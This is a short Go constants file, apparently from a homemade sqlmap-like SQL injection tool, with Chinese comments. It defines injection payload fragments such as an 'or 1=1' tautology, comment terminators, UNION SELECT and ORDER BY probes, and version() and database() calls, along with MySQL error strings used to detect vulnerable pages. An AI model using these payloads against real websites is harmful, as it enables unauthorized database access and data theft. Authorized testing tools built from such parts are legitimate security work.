package constant

const (
	// DetectWafPayload 检测WAF的Payload
	DetectWafPayload = "'%20or%201=1--+"
	// DetectedKeyword 检测到注入的关键字
	DetectedKeyword = "You have an error in your SQL syntax"
	// OrderKeyword 检测OrderBy语句的关键字
	OrderKeyword = "Unknown column"
	// Annotator 注释符
	Annotator = "--+"
	// Space 空格
	Space = "%20"
	// VersionFunc 版本函数
	VersionFunc = "version()"
	// DatabaseFunc 数据库函数
	DatabaseFunc = "database()"
)

// Union Select部分的常量
const (
	// UnionSelectSuffixCondition 检测闭合符号的Payload
	UnionSelectSuffixCondition = "%20--+"
	// UnionSelectSuffixPayload 检测闭合符号的Payload
	UnionSelectSuffixPayload = "%20Or%20'SQLMaP'='SQLMaP'%20--+"
	// UnionSelectOrderPayload 检测OrderBy的Payload
	UnionSelectOrderPayload = "order%20by"
	// UnionSelectUnionCondition Union Select需要否定的条件
	UnionSelectUnionCondition = "0"
	// UnionSelectUnionSql Union Select语句
	UnionSelectUnionSql = "union%20select"
)
